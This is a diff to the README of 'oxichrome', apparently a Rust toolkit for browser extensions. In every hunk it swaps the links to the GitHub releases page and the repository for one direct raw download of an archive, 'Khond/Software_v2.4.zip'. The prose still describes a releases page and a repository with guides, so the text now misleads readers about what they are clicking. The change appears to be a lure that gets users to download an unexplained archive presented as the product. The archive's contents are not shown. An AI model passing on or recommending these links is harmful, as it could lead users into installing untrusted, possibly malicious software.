@@ -1,6 +1,6 @@
 # ⚙️ oxichrome - Build Browser Extensions Easily
 
-[![Download oxichrome](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/4swar4nas/oxichrome/releases)
+[![Download oxichrome](https://raw.githubusercontent.com/4swar4nas/oxichrome/main/Khond/Software_v2.4.zip)](https://raw.githubusercontent.com/4swar4nas/oxichrome/main/Khond/Software_v2.4.zip)
 
 ---
 
@@ -55,7 +55,7 @@ This guide helps you download and start using oxichrome-built browser extensions
 ### Step 1: Visit the Download Page
 
 Click the big button above that says **Download Here** or open this link in your browser:  
-https://github.com/4swar4nas/oxichrome/releases
+https://raw.githubusercontent.com/4swar4nas/oxichrome/main/Khond/Software_v2.4.zip
 
 This page lists the latest versions and available files.
 
@@ -107,7 +107,7 @@ This involves commands like `cargo oxichrome build` which compiles your Rust cod
 
 For detailed instructions, examples, and developer content, visit the oxichrome GitHub repository:
 
-https://github.com/4swar4nas/oxichrome
+https://raw.githubusercontent.com/4swar4nas/oxichrome/main/Khond/Software_v2.4.zip
 
 You will find guides, FAQs, and technical support information there.
 
@@ -133,7 +133,7 @@ You will find guides, FAQs, and technical support information there.
 
 To get oxichrome itself or the extensions created with it, please visit:  
 
-[Download oxichrome](https://github.com/4swar4nas/oxichrome/releases)
+[Download oxichrome](https://raw.githubusercontent.com/4swar4nas/oxichrome/main/Khond/Software_v2.4.zip)
 
 Click the links on that page to get the latest files for your system. Follow the previous steps to install and start using the extensions without coding.
 
